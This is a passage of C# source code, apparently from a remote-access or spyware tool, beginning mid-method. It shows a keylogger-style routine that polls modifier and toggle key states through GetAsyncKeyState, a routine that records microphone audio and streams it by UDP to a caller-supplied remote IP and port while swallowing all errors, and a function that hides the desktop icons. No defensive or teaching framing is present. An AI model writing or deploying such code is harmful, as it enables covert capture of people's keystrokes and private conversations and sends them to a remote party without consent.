                        myKeys.Add(Keys.Menu.ToString()); //Add 'Menu' (Alt key) if enabled.
                    if (AltKeyL && !(myKeys.Contains(Keys.LMenu.ToString())))
                        myKeys.Add(Keys.LMenu.ToString()); //Add 'LMenu' if enabled.
                    if (AltKeyR && !(myKeys.Contains(Keys.RMenu.ToString())))
                        myKeys.Add(Keys.RMenu.ToString()); //Add 'RMenu' if enabled.
                    if (CapsLock && (!(myKeys.Contains(Keys.CapsLock.ToString())) && !(myKeys.Contains(Keys.CapsLock.ToString() + "[Enabled]"))))
                        myKeys.Add(Keys.CapsLock.ToString() + "[Enabled]"); //Add 'CapsLock[Enabled]' if enabled.
                    if (NumLock && (!(myKeys.Contains(Keys.NumLock.ToString())) && !(myKeys.Contains(Keys.NumLock.ToString() + "[Enabled]"))))
                        myKeys.Add(Keys.NumLock.ToString() + "[Enabled]"); //Add 'NumLock' if enabled.
                }
            }

            return myKeys; //Return the list.
        }

        //-> Get keys toogle state (on/off).
        #region Toggles
        public bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey)); }
        }
        public bool ControlKeyL
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.LControlKey)); }
        }
        public bool ControlKeyR
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.RControlKey)); }
        }
        public bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)); }
        }
        public bool ShiftKeyL
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.LShiftKey)); }
        }
        public bool ShiftKeyR
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.RShiftKey)); }
        }
        public bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu)); }
        }
        public bool AltKeyL
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.LMenu)); }
        }
        public bool AltKeyR
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.RMenu)); }
        }
        public bool CapsLock
        {
            get { return Convert.ToBoolean(GetKeyState(Keys.CapsLock)); }
        }
        public bool NumLock
        {
            get { return Convert.ToBoolean(GetKeyState(Keys.NumLock)); }
        }
        #endregion

        #endregion

        #region record and stream

        public void startRecordServer(int codec, string m_pLoacalIP, int m_pLocalPort, string m_pRemoteIP, int m_pRemotePort, int m_pInDevicesselected)
        {
            try
            {
                if (m_pUdpServer != null)
                {
                    m_pUdpServer.Dispose();
                    m_pUdpServer = null;
                }

                if (m_pWaveIn != null)
                {
                    m_pWaveIn.Dispose();
                    m_pWaveIn = null;
                }


                m_Codec = codec;
                m_pUdpServer = new UdpServer();
                m_pUdpServer.Bindings = new IPEndPoint[] { new IPEndPoint(IPAddress.Parse(m_pLoacalIP), m_pLocalPort) };

                m_pUdpServer.Start();


                m_pTargetEP = new IPEndPoint(IPAddress.Parse(m_pRemoteIP), m_pRemotePort);

                m_pWaveIn = new WaveIn(WaveIn.Devices[m_pInDevicesselected], 11025, 16, 1, 400);
                m_pWaveIn.BufferFull += new BufferFullHandler(m_pWaveIn_BufferFull);
                m_pWaveIn.Start();

            }
            catch (Exception ex)
            {

            }
        }
        #region method m_pWaveIn_BufferFull

        /// <summary>
        /// This method is called when recording buffer is full and we need to process it.
        /// </summary>
        /// <param name="buffer">Recorded data.</param>
        private void m_pWaveIn_BufferFull(byte[] buffer)
        {
            // Compress data. 
            byte[] encodedData = null;
            if (m_Codec == 0)
            {
                encodedData = G711.Encode_aLaw(buffer, 0, buffer.Length);
            }
            else if (m_Codec == 1)
            {
                encodedData = G711.Encode_uLaw(buffer, 0, buffer.Length);
            }

            // We just sent buffer to target end point.

            m_pUdpServer.SendPacket(encodedData, 0, encodedData.Length, m_pTargetEP);
        }

        #endregion

        public void StopRecording()
        {
            if (m_pUdpServer != null)
            {
                m_pUdpServer.Dispose();
                m_pUdpServer = null;
            }
            if (m_pWaveIn != null)
            {
                m_pWaveIn.Dispose();
                m_pWaveIn = null;
            }

        }

        public List<string> getWavInputDevices()
        {
            List<string> list = new List<string>();
            foreach (WavInDevice device in WaveIn.Devices)
            {
                list.Add(device.Name);
            }
            return list;
        }
        #endregion

        #region camera


        #endregion


        #region show/hide icon
        //Hide Desktop Icons
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public void HideDeskTopIcon(bool hide)
        {
            IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);

            if (hide)
            {
                ShowWindow(hWnd, 0);
            }
            else
            {
                ShowWindow(hWnd, 5);
            }
        }
        #endregion
    }


}


